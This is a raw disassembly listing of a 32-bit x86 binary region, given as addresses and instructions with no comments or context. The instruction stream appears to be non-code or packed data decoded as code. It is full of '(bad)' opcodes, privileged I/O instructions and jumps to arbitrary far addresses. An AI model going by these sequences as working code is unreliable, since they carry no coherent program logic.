  41906a:	or     dl,BYTE PTR [edi-0x49]
  41906d:	retf   
  41906e:	popa   
  41906f:	pop    ebx
  419070:	leave  
  419071:	into   
  419072:	add    al,0x55
  419074:	aad    0x75
  419076:	add    cl,BYTE PTR [ecx+ebx*2+0x31]
  41907a:	or     eax,0xf6ebc24f
  41907f:	mov    DWORD PTR [edx],esi
  419081:	aad    0xfb
  419083:	and    ecx,0xd6f30bff
  419089:	into   
  41908a:	xchg   DWORD PTR [edi-0x44bf125a],eax
  419090:	sbb    eax,0xd182e4c8
  419095:	sbb    BYTE PTR [ecx-0x18],0x7c
  419099:	dec    ebp
  41909a:	sti    
  41909b:	call   0xd9bf:0xfb7b14a2
  4190a2:	sub    DWORD PTR [ebp-0x7c3d767f],ecx
  4190a8:	loop   0x4190c9
  4190aa:	lea    edx,[edx+edx*4]
  4190ad:	fld    TBYTE PTR [ebx+edx*2-0x2180e1f4]
  4190b4:	bound  ebx,QWORD PTR [edi-0x17820279]
  4190ba:	add    eax,0xf157974
  4190bf:	je     0x4190cd
  4190c1:	pop    ss
  4190c2:	pop    ds
  4190c3:	mov    ch,0x4
  4190c5:	je     0x4190a1
  4190c7:	in     eax,0xb2
  4190c9:	mov    ecx,0x4310d761
  4190ce:	and    BYTE PTR [ebx-0x15],cl
  4190d1:	push   ebx
  4190d2:	jge    0x41909d
  4190d4:	jae    0x41913a
  4190d6:	(bad)  
  4190d7:	dec    eax
  4190d8:	jge    0x419120
  4190da:	inc    esp
  4190db:	stc    
  4190dc:	xor    al,0xfd
  4190de:	add    esi,edx
  4190e0:	pop    esp
  4190e1:	stc    
  4190e2:	sbb    al,0xf9
  4190e4:	jmp    0x4190f4
  4190e6:	fstp   st(0)
  4190e8:	fld    TBYTE PTR [ebx-0x34922600]
  4190ee:	xor    al,0x49
  4190f0:	add    al,0x9
  4190f2:	fldz   
  4190f4:	(bad)  
  4190f5:	enter  0x564,0x4e
  4190f9:	pop    ecx
  4190fa:	xor    BYTE PTR ds:0x90f23f09,0x83
  419101:	cmp    al,0xa0
  419103:	add    al,BYTE PTR [eax-0x38]
  419106:	add    eax,0xf20f08fa
  41910b:	and    BYTE PTR [edi],cl
  41910d:	inc    eax
  41910e:	pushf  
  41910f:	or     al,0x50
  419111:	ret    
  419112:	mov    esp,tr6
  419115:	adc    bl,BYTE PTR [edi-0x7fd81b04]
  41911b:	xchg   esi,eax
  41911c:	cwde   
  41911d:	push   ss
  41911e:	and    BYTE PTR [esi+edi*4-0x1194d7e7],bh
  419125:	xor    bh,BYTE PTR [edi]
  419127:	repnz xchg ebx,eax
  419129:	sbb    al,0xf9
  41912b:	add    dl,BYTE PTR [ebp+0x43b74020]
  419131:	mov    edx,0xcbb7e723
  419136:	test   DWORD PTR [edi],esp
  419138:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419139:	aam    0x5f
  41913b:	and    eax,0x84e72a13
  419140:	xchg   ecx,eax
  419141:	sub    dh,bl
  419143:	lahf   
  419144:	(bad)  
  419145:	std    
  419146:	xor    ah,0x20
  419149:	out    0xb5,al
  41914b:	sub    eax,0xa931a009
  419150:	pop    edi
  419151:	jecxz  0x419183
  419153:	add    al,0xbf
  419155:	leave  
  419156:	sbb    ecx,DWORD PTR [esi+0x6fe6fe34]
  41915c:	inc    ch
  41915e:	cs mov esp,0x4037b1a2
  419164:	jbe    0x4191a0
  419166:	imul   ecx,DWORD PTR [ebx],0xffffffde
  419169:	cmp    ch,al
  41916b:	mov    DWORD PTR [ebx+eiz*1],eax
  41916e:	(bad)  
  41916f:	mov    bh,BYTE PTR [esi]
  419171:	das    
  419172:	jmp    ebp
  419174:	outs   dx,DWORD PTR ds:[esi]
  419175:	bound  ebp,QWORD PTR [ebp+eax*8+0x41ad78eb]
  41917c:	cmp    BYTE PTR [edx+0x17],0xb7
  419180:	xlat   BYTE PTR es:[ebx]
  419182:	fadd   DWORD PTR [eax+edx*4-0x54]
  419186:	outs   dx,BYTE PTR ds:[esi]
  419187:	dec    ebx
  419189:	jg     0x419184
  41918b:	xor    bh,BYTE PTR [eax-0x7a]
  41918e:	xchg   DWORD PTR [eax-0x4c],ecx
  419191:	push   edi
  419192:	or     bh,BYTE PTR [edi]
  419194:	push   ss
  419195:	push   0xeda14ba9
  41919a:	int3   
  41919b:	into   
  41919c:	sbb    eax,edx
  41919e:	ror    DWORD PTR [esi+0x40],cl
  4191a1:	(bad)  
  4191a2:	(bad)  
  4191a3:	(bad)  
  4191a4:	jmp    DWORD PTR [eax+0x61401484]
  4191aa:	push   ecx
  4191ab:	pop    ecx
  4191ac:	test   BYTE PTR [edx+0x40],dl
  4191af:	enter  0x19a5,0x90
  4191b3:	mov    ecx,0x55a56fa5
  4191b8:	inc    eax
  4191b9:	cmp    cl,BYTE PTR [edi]
  4191bb:	and    ah,dh
  4191bd:	daa    
  4191be:	(bad)  
  4191bf:	retf   
  4191c0:	into   
  4191c1:	pop    eax
  4191c2:	inc    eax
  4191c3:	test   BYTE PTR [ecx],cl
  4191c5:	(bad)  
  4191c6:	(bad)  
  4191c7:	(bad)  
  4191c8:	call   DWORD PTR [eax+edi*8-0x7ec0c688]
  4191cf:	pop    esp
  4191d0:	inc    eax
  4191d1:	in     eax,0xb
  4191d3:	mov    ecx,0x8f07d736
  4191d8:	mov    eax,ds:0x4edf405f
  4191dd:	addr16 add al,0xcd
  4191e0:	leave  
  4191e1:	repnz leave 
  4191e3:	bound  eax,QWORD PTR [eax-0x6a]
  4191e6:	and    al,BYTE PTR [ecx-0x120bb]
  4191ec:	inc    DWORD PTR [eax+0x7c]
  4191ef:	outs   dx,DWORD PTR ds:[esi]
  4191f0:	cld    
  4191f1:	gs inc eax
  4191f3:	sahf   
  4191f4:	mov    ch,0x70
  4191f6:	sub    ebp,DWORD PTR [eax+0x699dc5ad]
  4191fc:	inc    eax
  4191fd:	aad    0xa6
  4191ff:	iret   
  419200:	dec    DWORD PTR [ecx+0x1f]
  419203:	js     0x41925f
  419205:	inc    eax
  419206:	mov    ds:0xffff9b14,eax
  41920b:	(bad)  
  41920c:	inc    ebp
  41920e:	push   ss
  41920f:	stos   DWORD PTR es:[edi],eax
  419210:	mov    bl,0xef
  419212:	cmp    eax,0xe98ce041
  419217:	or     cl,0x47
  41921a:	mov    edx,0xaa41a893
  41921f:	pop    ss
  419220:	out    0x7f,al
  419222:	sub    esp,DWORD PTR [ecx+0x4212b616]
  419228:	imul   edx,DWORD PTR [ebp+0x27],0x39
  41922c:	(bad)  
  41922d:	dec    DWORD PTR [ebx]
  41922f:	(bad)  
  419230:	push   edi
  419232:	jo     0x419214
  419234:	jl     0x419278
  419236:	xor    cl,cl
  419238:	cmp    al,0xe3
  41923a:	call   DWORD PTR [esi+0x42e78a52]
  419240:	mov    fs,WORD PTR [ebp+ebx*4-0x55811405]
  419247:	push   ecx
  419248:	inc    ebx
  419249:	mov    WORD PTR [edi],gs
  41924b:	sbb    edi,esp
  41924d:	(bad)  
  41924e:	jmp    FWORD PTR [edx+0x5c]
  419251:	sbb    esp,edi
  419253:	sar    BYTE PTR es:[ebx-0x331c89bd],cl
  41925a:	repnz sub DWORD PTR [edi],ebp
  41925d:	test   BYTE PTR [ecx+0xad24426],al
  419263:	nop
  419264:	fist   DWORD PTR [ebx-0x5c]
  41926a:	call   FWORD PTR [edi-0x55e8bb70]
  419270:	clc    
  419271:	scas   al,BYTE PTR es:[edi]
  419272:	adc    bl,ah
  419274:	(bad)
  419277:	inc    esp
  419278:	pop    ecx
  419279:	pushf  
  41927a:	mov    al,0xe9
  41927c:	pop    es
  41927d:	pushf  
  41927e:	mov    dh,dl
  419280:	fs inc ebp
  419282:	aam    0xf3
  419284:	imul   ebx
  419286:	loope  0x4192d2
  419288:	jp     0x41921f
  41928a:	iret   
  41928b:	(bad)  
  41928c:	(bad)  
  41928d:	(bad)  
  41928e:	inc    DWORD PTR [ebp+0x62]
  419291:	mov    ds:0xd8dc0795,al
  419296:	ds mov eax,0x91c74639
  41929c:	push   cs
  41929d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41929e:	scas   al,BYTE PTR es:[edi]
  41929f:	mov    al,ds:0x46a3e319
  4192a4:	pop    ss
  4192a5:	or     al,0x75
  4192a7:	add    DWORD PTR [esi+0x48c97675],0x78b7e44d
  4192b1:	mov    eax,ds:0x3993a7ff
  4192b6:	cmp    esi,DWORD PTR ds:0x53edb2b8
  4192bc:	mov    ds:0x15dc53d,eax
  4192c1:	sahf   
  4192c2:	xchg   edx,eax
  4192c3:	(bad)  
  4192c4:	(bad)  
  4192c6:	call   FWORD PTR [edx-0x5a]
  4192c9:	lock mov eax,ds:0xa554c020
  4192cf:	mov    WORD PTR [edi],?
  4192d1:	popa   
  4192d2:	mov    ebx,DWORD PTR [edx+0x22]
  4192d5:	and    eax,0xdbf9895d
  4192da:	addr16 clc 
  4192dc:	repz daa 
  4192de:	mov    edi,0xff80c8a2
  4192e3:	(bad)  
  4192e4:	call   FWORD PTR [ebp-0x23]
  4192e7:	sub    BYTE PTR [esi-0x65],0x97
  4192eb:	and    BYTE PTR [edx-0x3b9fadfe],cl
  4192f1:	and    eax,0xd559f075
  4192f6:	outs   dx,BYTE PTR ds:[esi]
  4192f7:	bound  edx,QWORD PTR [ecx]
  4192f9:	xor    eax,0xc37bcaae
  4192fe:	push   ds
  4192ff:	test   al,0x55
  419301:	push   ds
  419302:	retf   
  419303:	lods   al,BYTE PTR ds:[esi]
  419304:	jnp    0x41937a
  419306:	and    BYTE PTR [ebx-0x75],ah
  419309:	std    
  41930a:	lods   eax,DWORD PTR ds:[esi]
  41930b:	adc    al,bh
  41930d:	pop    es
  41930e:	jne    0x41932c
  419310:	push   0x1
  419312:	or     ebx,DWORD PTR [edi+edi*8]
  419315:	stc    
  419316:	mov    ds:0xde55e03,al
  41931b:	mov    ds:0x7c5d02df,eax
  419320:	pop    eax
  419321:	sbb    BYTE PTR [edi+ecx*1-0xc],cl
  419325:	movzx  edi,WORD PTR [eax]
  419328:	inc    eax
  419329:	mov    ch,0xb5
  41932b:	mov    ds:0x8dba2089,al
  419330:	jns    0x419366
  419332:	push   0x2e
  419334:	jb     0x4192fa
  419336:	dec    ebp
  419337:	das    
  419338:	and    DWORD PTR [eax-0x753e3a98],eax
  41933e:	sbb    al,0x81
  419340:	xchg   esi,eax
  419341:	and    al,0x4d
  419343:	xor    esp,DWORD PTR [ecx]
  419345:	pop    ecx
  419346:	fldcw  WORD PTR [esi+0x7]
  419349:	xchg   esi,eax
  41934a:	clc    
  41934b:	hlt    
  41934c:	jp     0x41937d
  41934e:	hlt    
  41934f:	push   eax
  419350:	xor    edi,eax
  419352:	bound  esi,QWORD PTR [eax-0x63ff9b1e]
  419358:	mov    edx,0x6c87122c
  41935d:	dec    ebx
  41935e:	rcl    DWORD PTR ds:0x2ec71c60,1
  419364:	fidivr WORD PTR [edx+0xf]
  419367:	out    dx,eax
  419368:	mov    ax,ds:0xffc0eb70
  41936e:	data16 adc dh,al
  419371:	call   0x2da83973
  419376:	aas    
  419377:	or     ax,dx
  41937a:	mov    ds:0xffffac14,ax
  419380:	jmp    FWORD PTR [edi]
  419382:	sbb    ecx,DWORD PTR [edi+0x46]
  419385:	push   esp
  419386:	push   edi
  419387:	inc    ecx
  419388:	push   edx
  419389:	inc    ebp
  41938a:	pop    esp
  41938b:	inc    edx
  41938c:	outs   dx,DWORD PTR ds:[esi]
  41938d:	jb     0x4193fb
  41938f:	popa   
  419390:	outs   dx,BYTE PTR ds:[esi]
  419391:	fs pop esp
  419393:	inc    esp
  419394:	gs ins BYTE PTR es:[edi],dx
  419396:	jo     0x419400
  419398:	imul   ebx,DWORD PTR [edx+edx*2+0x54],0x87fb004c
  4193a0:	loopne 0x4193a1
  4193a2:	inc    esi
  4193a3:	push   eax
  4193a4:	push   ebp
  4193a5:	dec    ebp
  4193a6:	popa   
  4193a7:	jae    0x419414
  4193a9:	push   esi
  4193aa:	popa   
  4193ab:	ins    BYTE PTR es:[edi],dx
  4193ac:	jne    0x4193c5
  4193ae:	fninit 
  4193b0:	fldcw  WORD PTR ds:0xb624139
  4193b7:	shr    ebx,cl
  4193b9:	adc    al,BYTE PTR [eax]
  4193bb:	repnz dec ebp
  4193bd:	(bad)  
  4193be:	out    dx,eax
  4193bf:	push   0xffffffdb
  4193c1:	adc    edx,edi
  4193c3:	mov    esi,DWORD PTR [eax-0x2c]
  4193c6:	xor    ecx,ecx
  4193c8:	mov    cl,BYTE PTR [esi]
  4193ca:	inc    ecx
  4193cb:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4193cd:	lock push 0x5d
  4193d0:	dec    ebx
  4193d1:	push   esp
  4193d2:	fdiv   st(0),st
  4193d4:	add    ah,BYTE PTR ds:0x4777b317
  4193da:	mov    al,ds:0x10229c5b
  4193df:	add    al,0x19
  4193e1:	mov    al,ds:0xf10dd08b
  4193e6:	mov    ecx,0x5b54d81a
  4193eb:	sbb    ecx,DWORD PTR [ecx-0x769f2fe3]
  4193f1:	mov    cl,0xd
  4193f3:	jnp    0x4193b5
  4193f5:	fdiv   DWORD PTR [edi]
  4193f7:	test   bh,ch
  4193f9:	or     BYTE PTR [ebx-0x52],cl
  4193fc:	fist   DWORD PTR ds:0x9c241620
  419402:	or     ecx,DWORD PTR [edi]
  419404:	or     BYTE PTR [ebp+0x64],ch
  419407:	fdivr  QWORD PTR [esi-0x7a]
  41940a:	into   
  41940b:	pop    DWORD PTR ds:0x4252f68
  419411:	sbb    BYTE PTR [esi+0x5],bh
  419414:	lock or edi,DWORD PTR [ebx+0x7037ecf6]
  41941b:	pop    es
  41941c:	mov    dl,0x6e
  41941e:	or     bh,bh
  419420:	push   ecx
  419421:	cld    
  419422:	ret    
  419423:	sbb    ebp,DWORD PTR [edi+edi*4+0x3d]
  419427:	jnp    0x4193ec
  419429:	xchg   esi,eax
  41942a:	stos   DWORD PTR es:[edi],eax
  41942b:	mov    ecx,DWORD PTR [ebx-0x28]
  41942e:	xor    DWORD PTR [ecx+eax*8-0x7748b6b9],ebp
  419435:	rol    BYTE PTR [edx],0x99
  419438:	pop    ecx
  419439:	cwde   
  41943a:	inc    eax
  41943b:	mov    edx,esp
  41943d:	push   cs
  41943e:	outs   dx,BYTE PTR ds:[esi]
  41943f:	pop    ebp
  419440:	ins    BYTE PTR es:[edi],dx
  419441:	adc    eax,0xc40182b8
  419446:	pop    ebx
  419447:	fdivr  QWORD PTR [edx]
  419449:	aam    0x52
  41944b:	inc    DWORD PTR [edx+0x42]
  41944e:	sbb    ebp,ebx
  419450:	in     eax,dx
  419451:	cmp    esp,edx
  419453:	je     0x419472
  419455:	mov    edi,0xc0dfdb0b
  41945a:	lods   eax,DWORD PTR ds:[esi]
  41945b:	mov    dl,0xd
  41945d:	jae    0x41946f
  41945f:	inc    DWORD PTR [esi]
  419461:	mov    edi,DWORD PTR [ebx+0x14]
  419464:	mov    DWORD PTR [edi+eax*1],esi
  419467:	nop    DWORD PTR [eax+0x41]
  41946b:	test   al,0xdd
  41946d:	dec    ecx
  41946e:	jne    0x41948c
  419470:	jne    0x419455
  419472:	xchg   ebx,eax
  419473:	push   esi
  419474:	push   0xd997f6b6
  419479:	mov    edx,DWORD PTR ss:[esi-0x40]
  41947d:	mov    esi,DWORD PTR [esi+0x3c]
  419480:	xchg   ebp,eax
  419481:	pop    es
  419482:	xor    eax,0xb60ebbdd
  419487:	(bad)  
  419488:	fdivr  DWORD PTR ds:0xd18721e9
  41948e:	cmp    ecx,0x5b78ff9e
  419494:	cli    
  419495:	fdiv   DWORD PTR [ebx+0x11]
  419498:	pop    es
  419499:	(bad)  
  41949a:	jb     0x4194a3
  41949c:	movsx  eax,WORD PTR [ebx]
  41949f:	xchg   edx,eax
  4194a0:	and    edi,edi
  4194a2:	loope  0x419465
  4194a4:	ins    DWORD PTR es:[edi],dx
  4194a5:	mov    eax,ds:0x3e003419
  4194aa:	rol    DWORD PTR [eax-0x73c7ee75],0xe
  4194b1:	sbb    eax,0x2727a440
  4194b6:	push   edi
  4194b7:	mov    cl,0x50
  4194b9:	or     eax,0xd9b54fd0
  4194be:	jmp    0x4d58b8b3
  4194c3:	sahf   
  4194c4:	add    BYTE PTR [ebx],ah
  4194c6:	mov    ?,WORD PTR [eax]
  4194c8:	xchg   esp,eax
  4194c9:	push   es
  4194ca:	xor    DWORD PTR [esi-0x7f],0x4b
  4194ce:	and    ebx,DWORD PTR [ebx+eax*8-0x4cbfa4c8]
  4194d5:	push   eax
  4194d6:	bound  edx,QWORD PTR [esp+edx*1]
  4194d9:	adc    dl,dh
  4194db:	mov    ds:0x89dd002d,al
  4194e0:	adc    ecx,DWORD PTR [ecx+0x798b2d24]
  4194e6:	sbb    al,0x83
  4194e8:	fist   WORD PTR [edi+0x4d8d1a1a]
  4194ee:	clc    
  4194ef:	and    BYTE PTR [eax+0x18],dl
  4194f2:	les    esp,FWORD PTR [edx]
  4194f4:	int3   
  4194f5:	(bad)  [eax]
  4194f7:	ja     0x419529
  4194f9:	cli    
  4194fa:	pop    esi
  4194fb:	jae    0x419485
  4194fd:	setne  BYTE PTR [edi-0x454e7f1d]
  419504:	fdiv   DWORD PTR ds:0x1c589523
  41950a:	mov    WORD PTR [esi-0x6d],fs
  41950d:	cmovb  edi,esp
  419510:	lock mov eax,ebx
  419513:	pop    edi
  419514:	out    dx,eax
  419515:	pop    ebp
  419516:	adc    eax,0xb83825ba
  41951b:	push   0x8b165829
  419520:	(bad)  [edi]
  419522:	jmp    0x7252:0x303b32ea
  419529:	ins    BYTE PTR es:[edi],dx
  41952a:	jo     0x419530
  41952c:	jne    0x41953e
  41952e:	pop    es
  41952f:	or     ch,ch
  419531:	push   edx
  419532:	sub    eax,0x875082f
  419537:	or     al,0x2d
  419539:	je     0x41954e
  41953b:	and    BYTE PTR [ecx+0x2d0d0970],ah
  419541:	fcom   QWORD PTR [ebp-0x3b]
  419544:	jnp    0x419559
  419546:	push   0xffffffa8
  419548:	fwait
  419549:	nop
  41954a:	xchg   ebx,eax
  41954b:	adc    cl,BYTE PTR ds:0x39c8038b
  419551:	xor    bl,BYTE PTR [ebx+0x344c2404]
  419557:	sbb    eax,DWORD PTR [ebx-0x5d]
  41955a:	addr16 push eax
  41955c:	ficom  DWORD PTR [edi+0x57]
  41955f:	xchg   esi,eax
  419560:	sbb    eax,0xb6971655
  419565:	bound  edi,QWORD PTR [esi-0x30]
  419568:	mov    eax,0x510f260d
  41956d:	sub    eax,0xf8961e1b
  419572:	add    dh,dl
  419574:	scas   ax,WORD PTR es:[edi]
  419576:	jne    0x4195d1
  419578:	data16 idiv BYTE PTR [esi-0x3d]
  41957c:	pop    eax
  41957d:	call   0xee4891dc
  419582:	sub    eax,ecx
  419584:	mov    esi,DWORD PTR [edi+eax*2+0x42]
  419588:	xchg   edi,eax
  419589:	push   eax
  41958a:	fstp   TBYTE PTR [ebp+0x4980e7f1]
  419590:	add    al,0x59
  419592:	pop    eax
  419593:	gs jmp esi
  419596:	pop    ecx
  419597:	mov    ecx,0x7717f01b
  41959c:	mov    esi,es
  41959e:	popf   
  41959f:	inc    ebp
  4195a0:	add    BYTE PTR [ecx],bh
  4195a2:	shl    BYTE PTR [edi],1
  4195a4:	jg     0x41961b
  4195a6:	repz pop edi
  4195a8:	in     al,dx
  4195a9:	mov    ecx,0xb8170d86
  4195ae:	jbe    0x419530
  4195b0:	sbb    esp,DWORD PTR [edi+0x3]
  4195b3:	add    al,0x5c
  4195b5:	mov    eax,0xc966563d
  4195ba:	or     si,sp
  4195bd:	pop    ss
  4195be:	dec    bp
  4195c0:	or     eax,0xc026b0b6
  4195c5:	icebp  
  4195c6:	push   eax
  4195c7:	dec    esi
  4195c8:	pop    eax
  4195c9:	fs icebp 
  4195cb:	test   DWORD PTR [esi-0x53a17a72],esi
  4195d1:	pop    esi
  4195d2:	inc    esi
  4195d3:	popa   
  4195d4:	push   eax
  4195d5:	nop
  4195d6:	test   BYTE PTR ds:0x538dc2f5,0x61
  4195dd:	jl     0x4195e2
  4195df:	push   ebp
  4195e0:	hlt    
  4195e1:	xor    edx,edx
  4195e3:	clc    
  4195e4:	fs lock dec ebp
  4195e7:	fucomip st,st(0)
  4195e9:	mov    ebx,DWORD PTR [edx]
  4195eb:	mov    DWORD PTR [eax+0x41c70869],ebp
  4195f1:	xchg   ebp,eax
  4195f2:	and    al,0xc9
  4195f4:	mov    DWORD PTR [ecx+0xc],eax
  4195f7:	jge    0x4195ee
  4195f9:	mov    al,0xb0
  4195fb:	inc    esp
  4195fc:	or     ch,BYTE PTR [ebx]
  4195fe:	pop    edx
  4195ff:	cmp    ah,BYTE PTR [esi]
  419601:	pop    edi
  419602:	sub    al,0x8e
  419604:	xchg   edi,eax
  419605:	xchg   BYTE PTR [esi-0x41],dl
  419608:	sub    eax,0x5081b20e
  41960d:	mov    DWORD PTR [esp+eiz*4+0x5d],edi
  419611:	mov    WORD PTR [eax-0x64],ds
  419614:	add    al,0x27
  419616:	nop
  419617:	pop    ss
  419618:	adc    bh,bh
  41961a:	push   edx
  41961b:	clc    
  41961c:	jle    0x4195da
  41961e:	mov    esi,0xe40cf761
  419623:	push   ds
  419624:	jmp    0x4196a5
  419626:	add    ebp,edx
  419628:	sbb    bh,BYTE PTR [ebp-0x72]
  41962b:	fs adc eax,ebp
  41962e:	pop    ebx
  41962f:	ja     0x41967e
  419631:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419632:	or     edi,DWORD PTR ds:0x76e3409a
  419638:	adc    eax,esi
  41963a:	repnz fbstp TBYTE PTR [esi-0x517b93d]
  419641:	in     eax,dx
  419642:	push   cs
  419643:	cs adc al,0x1b
  419646:	add    BYTE PTR [ebx-0x16db91b0],bh
  41964c:	fidiv  WORD PTR [eax]
  41964e:	push   esp
  41964f:	push   0x2
  419651:	sbb    eax,0x58084ce4
  419656:	xor    ah,BYTE PTR [eax]
  419658:	int    0xf6
  41965a:	addr16 pop ss
  41965c:	add    eax,esp
  41965e:	add    al,0xe9
  419660:	in     eax,dx
  419661:	ds sub al,0x57
  419664:	pop    es
  419665:	push   eax
  419666:	push   ebx
  419667:	mov    cl,0x25
  419669:	push   esp
  41966a:	adc    ecx,DWORD PTR [edx]
  41966c:	hlt    
  41966d:	pop    ebx
  41966e:	mov    DWORD PTR [edi+0x1418b19],edi
  419674:	cmp    BYTE PTR [ecx],0xe9
  419677:	dec    ecx
  419678:	add    al,0xeb
  41967a:	jne    0x419688
  41967c:	movsx  edi,BYTE PTR [ecx+0x656e85c6]
  419683:	inc    ecx
  419684:	jmp    0x419636
  419686:	rol    DWORD PTR ds:0x7d9c9bad,0x52
  41968d:	xchg   DWORD PTR [ebx],esi
  41968f:	sbb    eax,0x51802504
  419694:	pop    ebp
  419695:	loope  0x419683
  419697:	xor    DWORD PTR ds:0x12b32b92,0x98761f52
  4196a1:	fwait
  4196a2:	in     al,0xe2
  4196a4:	pop    edx
  4196a5:	ficomp DWORD PTR ds:0xc01ab210
  4196ab:	pop    ebp
  4196ac:	jbe    0x419691
  4196ae:	sbb    al,0x58
  4196b0:	arpl   WORD PTR [edi+esi*8+0x1d],si
  4196b4:	fld    QWORD PTR [ebp+eiz*4-0x3c]
  4196b8:	jle    0x4196c9
  4196ba:	test   DWORD PTR [ebx],edx
  4196bc:	xchg   esp,eax
  4196bd:	add    DWORD PTR [edx+0x38dc3e85],0x48c221de
  4196c7:	lock outs dx,BYTE PTR ds:[esi]
  4196c9:	ins    DWORD PTR es:[edi],dx
  4196ca:	mov    cl,0xf4
  4196cc:	out    dx,al
  4196cd:	add    al,0x21
  4196cf:	test   al,0x8b
  4196d1:	das    
  4196d2:	pushf  
  4196d3:	shl    BYTE PTR [ecx-0xf],cl
  4196d6:	push   esp
  4196d7:	sub    di,WORD PTR [ebx+eiz*2]
  4196db:	shl    BYTE PTR [edi+0x9],cl
  4196de:	out    0x7d,eax
  4196e0:	inc    DWORD PTR ds:0x81488de0
  4196e6:	cmp    esi,ecx
  4196e8:	cli    
  4196e9:	out    dx,eax
  4196ea:	push   cs
  4196eb:	je     0x419724
  4196ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4196ee:	xor    BYTE PTR [eax],bh
  4196f0:	or     BYTE PTR [edi],dh
  4196f2:	mov    ch,BYTE PTR [edi+0x65]
  4196f5:	jbe    0x419720
  4196f7:	cs ja  0x41971a
  4196fa:	mov    dl,0x81
  4196fc:	xchg   BYTE PTR [ecx],al
  4196fe:	imul   esi,DWORD PTR [edi],0xffffffb4
  419701:	add    DWORD PTR [esi+esi*4+0x17],esi
  419705:	mov    ebp,ebp
  419707:	add    BYTE PTR [eax+0x3b],bl
  41970a:	stos   DWORD PTR es:[edi],eax
  41970b:	pushf  
  41970c:	jp     0x419772
  41970e:	or     al,0xe4
  419710:	mov    bl,0x64
  419712:	test   DWORD PTR ds:0x76013a0a,ecx
  419718:	push   ds
  419719:	xchg   BYTE PTR [ebp+0x4d],ch
  41971c:	cmp    eax,0x84e5015
  419721:	std    
  419722:	push   eax
  419723:	cmp    al,0x81
  419725:	mov    ecx,DWORD PTR [ebp+0x7074efee]
  41972b:	sub    DWORD PTR [ecx+0x33adf302],0xffffffdc
  419732:	sub    ch,ch
  419734:	adc    eax,0x871c531b
  419739:	sub    dl,bl
  41973b:	stos   BYTE PTR es:[edi],al
  41973c:	jne    0x41972d
  41973e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41973f:	push   eax
  419740:	push   ebx
  419741:	es loopne 0x419796
  419744:	fdivr  QWORD PTR [ebp-0x390ed84]
  41974a:	mov    esi,0xb0ff4347
  41974f:	add    BYTE PTR [ebp-0x60],ch
  419752:	add    eax,0x5f9f6f8b
  419757:	add    al,0xc7
  419759:	rcr    edi,cl
  41975b:	(bad)  
  41975c:	mov    es,WORD PTR [edi+0x42]
  41975f:	daa    
  419760:	or     al,0x61
  419762:	add    eax,0xe3ff6caf
  419767:	jge    0x4197b4
  419769:	lea    ebx,[ebp-0x7784cf2c]
  41976f:	adc    DWORD PTR es:[esi+0x0],esi
  419773:	or     BYTE PTR [edi+0x8413eee],ch
  419779:	sbb    ah,BYTE PTR [edx]
  41977b:	dec    eax
  41977c:	mov    eax,0x20fb2b29
  419781:	cwde   
  419782:	and    BYTE PTR [edi],al
  419784:	das    
  419785:	je     0x4197a6
  419787:	mov    ecx,DWORD PTR [edx+0x4c]
  41978a:	dec    edx
  41978b:	loopne 0x41970f
  41978d:	addr16 inc edx
  41978f:	fs jp  0x4197b0
  419792:	xor    BYTE PTR [edi],al
  419794:	cld    
  419795:	sbb    DWORD PTR [ecx-0x2e005fad],edi
  41979b:	lea    esi,[edi]
  41979d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41979e:	ss sub al,al
  4197a1:	dec    ebx
  4197a2:	(bad)  
  4197a3:	fsubr  DWORD PTR [esi+eax*2-0x10]
  4197a7:	icebp  
  4197a8:	lahf   
  4197a9:	call   0x5796ec08
  4197ae:	push   esi
  4197af:	push   ebx
  4197b0:	inc    ecx
  4197b1:	pop    es
  4197b2:	or     ebp,esi
  4197b4:	bound  ebp,QWORD PTR [edi+eax*4+0x6c]
  4197b8:	mov    dl,0x25
  4197ba:	pusha  
  4197bb:	pop    edi
  4197bc:	xor    bh,al
  4197be:	inc    eax
  4197bf:	cmp    edi,DWORD PTR [ebx+0x36]
  4197c2:	sti    
  4197c3:	dec    edi
  4197c4:	fisttp WORD PTR [ebp-0x6a76f57b]
  4197ca:	inc    edx
  4197cb:	mov    dl,0x7b
  4197cd:	aaa    
  4197ce:	dec    ebp
  4197cf:	js     0x419831
  4197d1:	add    al,0xfd
  4197d3:	lahf   
  4197d4:	rol    BYTE PTR [edx+0x8],cl
  4197d7:	call   0xc32c0778
  4197dc:	inc    esi
  4197dd:	jmp    0x14a985f6
  4197e2:	or     al,0x10
  4197e4:	pop    ecx
  4197e5:	cmp    DWORD PTR [ecx],0x7a543996
  4197eb:	arpl   WORD PTR [eax-0x3d],cx
  4197ee:	push   ebp
  4197ef:	(bad)  
  4197f0:	sub    al,0x39
  4197f2:	pop    edx
  4197f3:	mov    esp,DWORD PTR [esp+0x2c]
  4197f7:	lea    edi,[edx+0x6ff82bde]
  4197fd:	pop    ebp
  4197fe:	inc    esi
  4197ff:	enter  0xe2ff,0xc3
  419803:	xor    esi,esp
  419805:	jmp    0xe71d5416
  41980a:	retf   
  41980b:	sbb    DWORD PTR [edx],eax
  41980d:	leave  
  41980e:	ret    0xc30c
  419811:	das    
  419812:	mov    edi,0xccb5bc44
  419817:	pop    ss
  419818:	add    bh,BYTE PTR ds:0x2c7f5292
  41981e:	je     0x41987c
  419820:	cmp    eax,0xbfe66e1e
  419825:	mov    cs,WORD PTR [eax]
  419827:	adc    eax,0x52d5774
  41982c:	cvtps2pi mm0,QWORD PTR [edi+0x5feb3d12]
  419833:	cli    
  419834:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419835:	scas   eax,DWORD PTR es:[edi]
  419836:	dec    esi
  419837:	jmp    0x419899
  419839:	add    eax,0x833ff971
  41983e:	call   0x74780a45
  419843:	aad    0x6d
  419845:	jnp    0x419845
  419847:	jnp    0x41989b
  419849:	cmp    eax,0x74112996
  41984e:	cmp    eax,0x222e932d
  419853:	adc    eax,DWORD PTR [edx]
  419855:	sar    edi,1
  419857:	in     eax,dx
  419858:	sti    
  419859:	and    al,0xeb
  41985b:	cmp    ch,BYTE PTR ds:0x272f0efd
  419861:	cmp    eax,0x2ceb2674
  419866:	mov    al,0xc8
  419868:	jmp    0x419894
  41986a:	mov    al,0x56
  41986c:	jg     0x419865
